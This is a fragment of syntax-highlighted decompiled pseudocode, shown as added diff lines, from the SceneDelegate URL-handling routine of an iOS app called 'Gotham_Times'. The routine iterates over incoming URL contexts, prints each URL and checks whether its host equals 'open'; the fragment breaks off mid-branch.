+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_78</span><span class="p">;</span>
+<span class="w">  </span><span class="n">SceneDelegate</span><span class="w"> </span><span class="o">*</span><span class="n">local_70</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="n">local_68</span><span class="p">;</span>
+<span class="w">  </span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="n">local_60</span><span class="p">;</span>
+<span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="n">auStack_58</span><span class="w"> </span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+<span class="w">  </span><span class="n">undefined7</span><span class="w"> </span><span class="n">extraout_var</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">local_1d0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PTR_$$type_metadata_for_Any_100028708</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1c8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ulong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">PTR__swift_isaMask_100028640</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1c0</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Fatal error"</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1b8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Unexpectedly found nil while unwrapping an Optional value"</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1b0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Gotham_Times/SceneDelegate.swift"</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_60</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_68</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_70</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">SceneDelegate</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_78</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1d8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1a8</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">openURLContexts</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">  </span><span class="n">inputUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">param_1</span><span class="p">;</span>
+<span class="w">  </span><span class="n">_memset</span><span class="p">(</span><span class="n">auStack_a0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
+<span class="w">  </span><span class="n">local_b0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_e0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_d8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_108</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_110</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIStoryboard</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_118</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UINavigationController</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_130</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIViewController</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_1a0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Foundation</span><span class="o">::</span><span class="n">URL</span><span class="o">::</span><span class="n">typeMetadataAccessor</span><span class="p">();</span>
+<span class="w">  </span><span class="n">local_198</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">local_1a0</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">-8</span><span class="p">);</span>
+<span class="w">  </span><span class="n">local_190</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">local_198</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xfU</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffffffffffffff0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">pUVar7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inputUrl</span><span class="p">;</span>
+<span class="w">  </span><span class="n">SVar17</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1a8</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">PTR____chkstk_darwin_1000281f0</span><span class="p">)();</span>
+<span class="w">  </span><span class="n">puVar8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_390</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">local_190</span><span class="p">);</span>
+<span class="w">  </span><span class="n">local_180</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">extraout_x8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xfU</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffffffffffffff0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_188</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">puVar8</span><span class="p">;</span>
+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">PTR____chkstk_darwin_1000281f0</span><span class="p">)();</span>
+<span class="w">  </span><span class="n">puVar8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">puVar8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="n">local_180</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_170</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">extraout_x8_00</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xfU</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffffffffffffff0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_178</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">puVar8</span><span class="p">;</span>
+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">PTR____chkstk_darwin_1000281f0</span><span class="p">)();</span>
+<span class="w">  </span><span class="n">lVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">puVar8</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">local_170</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_160</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">extraout_x8_01</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xfU</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xfffffffffffffff0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_168</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">PTR____chkstk_darwin_1000281f0</span><span class="p">)();</span>
+<span class="w">  </span><span class="n">lVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lVar1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">local_160</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_158</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lVar1</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_70</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_68</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SVar17</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_60</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar7</span><span class="p">;</span>
+<span class="w">  </span><span class="n">_objc_retain</span><span class="p">();</span>
+<span class="w">  </span><span class="n">puVar8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">_OBJC_CLASS_$_UIWindowScene</span><span class="p">;</span>
+<span class="w">  </span><span class="n">_objc_opt_self</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_OBJC_CLASS_$_UIWindowScene</span><span class="p">);</span>
+<span class="w">  </span><span class="n">pUVar7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inputUrl</span><span class="p">;</span>
+<span class="w">  </span><span class="n">_swift_dynamicCastObjCClass</span><span class="p">(</span><span class="n">inputUrl</span><span class="p">,</span><span class="n">puVar8</span><span class="p">);</span>
+<span class="w">  </span><span class="n">local_1e0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar7</span><span class="p">;</span>
+<span class="w">  </span><span class="n">local_148</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pUVar7</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pUVar7</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">local_1e8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">inputUrl</span><span class="p">);</span>
+<span class="w">    </span><span class="n">local_1e0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1e8</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">local_1f0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1e0</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_1e0</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">UIScene</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">local_1f8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1e0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_210</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1e0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">local_78</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1e0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">_swift_bridgeObjectRetain</span><span class="p">(</span><span class="n">local_1a8</span><span class="p">.</span><span class="n">unknown</span><span class="p">);</span>
+<span class="w">    </span><span class="n">local_208</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__C</span><span class="o">::</span><span class="n">UIOpenURLContext</span><span class="o">::</span><span class="n">typeMetadataAccessor</span><span class="p">();</span>
+<span class="w">    </span><span class="n">__C</span><span class="o">::</span><span class="n">UIOpenURLContext</span><span class="o">::</span><span class="n">$lazy_protocol_witness_table_accessor</span><span class="p">();</span>
+<span class="w">    </span><span class="n">local_200</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">auStack_58</span><span class="p">;</span>
+<span class="w">    </span><span class="n">Swift</span><span class="o">::</span><span class="n">Set</span><span class="o">::</span><span class="n">$makeIterator</span><span class="p">(</span><span class="n">local_1a8</span><span class="p">);</span>
+<span class="w">    </span><span class="n">_memcpy</span><span class="p">(</span><span class="n">auStack_a0</span><span class="p">,</span><span class="n">local_200</span><span class="p">,</span><span class="mh">0x28</span><span class="p">);</span>
+<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">IVar9</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span>
+<span class="w">           </span><span class="o">&amp;</span>
+<span class="w">           </span><span class="n">$$demangling_cache_variable_for_type_metadata_for_Swift</span><span class="p">.</span><span class="n">Set</span><span class="o">&lt;</span><span class="n">__C</span><span class="p">.</span><span class="n">UIOpenURLContext</span><span class="o">&gt;</span><span class="p">.</span><span class="n">Iterato</span><span class="w"> </span><span class="n">r</span>
+<span class="w">      </span><span class="p">;</span>
+<span class="w">      </span><span class="n">___swift_instantiateConcreteTypeFromMangledName</span><span class="p">();</span>
+<span class="w">      </span><span class="n">Swift</span><span class="o">::</span><span class="n">Set</span><span class="o">::</span><span class="n">Iterator</span><span class="o">::</span><span class="n">$next</span><span class="p">(</span><span class="n">IVar9</span><span class="p">);</span>
+<span class="w">      </span><span class="n">UVar12</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_178</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_218</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_a8</span><span class="p">;</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_a8</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">undefined</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_220</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_a8</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_260</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_a8</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_b0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_a8</span><span class="p">;</span>
+<span class="w">      </span><span class="n">tVar22</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Swift</span><span class="o">::</span><span class="n">$_allocateUninitializedArray</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">      </span><span class="n">local_2a0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tVar22</span><span class="mf">.1</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_298</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tVar22</span><span class="p">.</span><span class="n">_0_8_</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_268</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">objc</span><span class="o">::</span><span class="n">protocol_t</span><span class="o">::</span><span class="n">WKUIDelegate</span><span class="p">;</span>
+<span class="w">      </span><span class="n">UVar10</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_260</span><span class="p">;</span>
+<span class="w">      </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_260</span><span class="p">,</span><span class="s">"URL"</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_objc_retainAutoreleasedReturnValue</span><span class="p">();</span>
+<span class="w">      </span><span class="n">local_290</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UVar10</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">      </span><span class="n">Foundation</span><span class="o">::</span><span class="n">URL</span><span class="o">::</span><span class="n">$_unconditionallyBridgeFromObjectiveC</span><span class="p">(</span><span class="n">UVar10</span><span class="p">);</span>
+<span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_2a0</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x18</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1a0</span><span class="p">;</span>
+<span class="w">      </span><span class="n">___swift_allocate_boxed_opaque_existential_0</span><span class="p">();</span>
+<span class="w">      </span><span class="n">pcVar20</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_1a0</span><span class="p">;</span>
+<span class="w">      </span><span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">local_198</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x20</span><span class="p">))();</span>
+<span class="w">      </span><span class="n">pcVar11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_298</span><span class="p">;</span>
+<span class="w">      </span><span class="n">Swift</span><span class="o">::</span><span class="n">$_finalizeUninitializedArray</span><span class="p">(</span><span class="n">local_298</span><span class="p">,</span><span class="n">local_1d0</span><span class="p">);</span>
+<span class="w">      </span><span class="n">pcVar21</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_290</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_270</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">      </span><span class="n">_objc_release</span><span class="p">();</span>
+<span class="w">      </span><span class="n">check_str</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">      </span><span class="n">check_str</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">      </span><span class="n">separator</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in_x3</span><span class="p">;</span>
+<span class="w">      </span><span class="n">separator</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar20</span><span class="p">;</span>
+<span class="w">      </span><span class="n">Swift</span><span class="o">::</span><span class="n">$print</span><span class="p">(</span><span class="n">check_str</span><span class="p">,</span><span class="n">separator</span><span class="p">);</span>
+<span class="w">      </span><span class="n">SVar23</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SVar23</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">      </span><span class="n">separator_00</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in_x3</span><span class="p">;</span>
+<span class="w">      </span><span class="n">separator_00</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar20</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_288</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_278</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">      </span><span class="n">Swift</span><span class="o">::</span><span class="n">$print</span><span class="p">(</span><span class="n">SVar23</span><span class="p">,</span><span class="n">separator_00</span><span class="p">);</span>
+<span class="w">      </span><span class="n">SVar24</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_288</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SVar24</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_270</span><span class="p">;</span>
+<span class="w">      </span><span class="n">separator_01</span><span class="p">.</span><span class="n">bridgeObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">      </span><span class="n">separator_01</span><span class="p">.</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_278</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_280</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar11</span><span class="p">;</span>
+<span class="w">      </span><span class="n">Swift</span><span class="o">::</span><span class="n">$print</span><span class="p">(</span><span class="n">SVar24</span><span class="p">,</span><span class="n">separator_01</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_280</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_278</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_270</span><span class="p">);</span>
+<span class="w">      </span><span class="n">UVar10</span><span class="p">.</span><span class="n">unknown</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_260</span><span class="p">;</span>
+<span class="w">      </span><span class="n">_objc_msgSend</span><span class="p">(</span><span class="n">local_260</span><span class="p">,</span><span class="n">local_268</span><span class="p">[</span><span class="mh">0x2e</span><span class="p">].</span><span class="n">instanceProperties</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_objc_retainAutoreleasedReturnValue</span><span class="p">();</span>
+<span class="w">      </span><span class="n">local_258</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UVar10</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">      </span><span class="n">Foundation</span><span class="o">::</span><span class="n">URL</span><span class="o">::</span><span class="n">$_unconditionallyBridgeFromObjectiveC</span><span class="p">(</span><span class="n">UVar10</span><span class="p">);</span>
+<span class="w">      </span><span class="n">local_250</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">local_198</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10</span><span class="p">);</span>
+<span class="w">      </span><span class="n">lVar18</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_168</span><span class="p">;</span>
+<span class="w">      </span><span class="p">(</span><span class="o">*</span><span class="n">local_250</span><span class="p">)(</span><span class="n">UVar12</span><span class="p">.</span><span class="n">unknown</span><span class="p">,</span><span class="n">local_168</span><span class="p">,</span><span class="n">local_1a0</span><span class="p">);</span>
+<span class="w">      </span><span class="n">Foundation</span><span class="o">::</span><span class="n">URL</span><span class="o">::</span><span class="n">$get_host</span><span class="p">(</span><span class="n">UVar12</span><span class="p">);</span>
+<span class="w">      </span><span class="n">local_248</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">local_198</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">      </span><span class="n">local_238</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UVar12</span><span class="p">.</span><span class="n">unknown</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_230</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lVar18</span><span class="p">;</span>
+<span class="w">      </span><span class="p">(</span><span class="o">*</span><span class="n">local_248</span><span class="p">)(</span><span class="n">local_178</span><span class="p">,</span><span class="n">local_1a0</span><span class="p">);</span>
+<span class="w">      </span><span class="p">(</span><span class="o">*</span><span class="n">local_248</span><span class="p">)(</span><span class="n">local_168</span><span class="p">,</span><span class="n">local_1a0</span><span class="p">);</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRetain</span><span class="p">(</span><span class="n">local_230</span><span class="p">);</span>
+<span class="w">      </span><span class="n">check_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Swift</span><span class="o">::</span><span class="n">String</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="s">"open"</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">      </span><span class="n">local_228</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">check_str</span><span class="p">.</span><span class="n">bridgeObject</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_240</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_str</span><span class="p">.</span><span class="n">str</span><span class="p">;</span>
+<span class="w">      </span><span class="n">_swift_bridgeObjectRetain</span><span class="p">();</span>
+<span class="w">      </span><span class="n">local_d0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_238</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_c8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_230</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_c0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_240</span><span class="p">;</span>
+<span class="w">      </span><span class="n">local_b8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">local_228</span><span class="p">;</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_230</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_228</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">LAB_1000195a4</span><span class="p">;</span>
+<span class="w">        </span><span class="n">$$outlined_destroy_of_Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_d0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">local_2a4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">$$outlined_init_with_copy_of_Swift</span><span class="p">.</span><span class="n">String</span><span class="o">?</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_d0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_140</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">local_b8</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
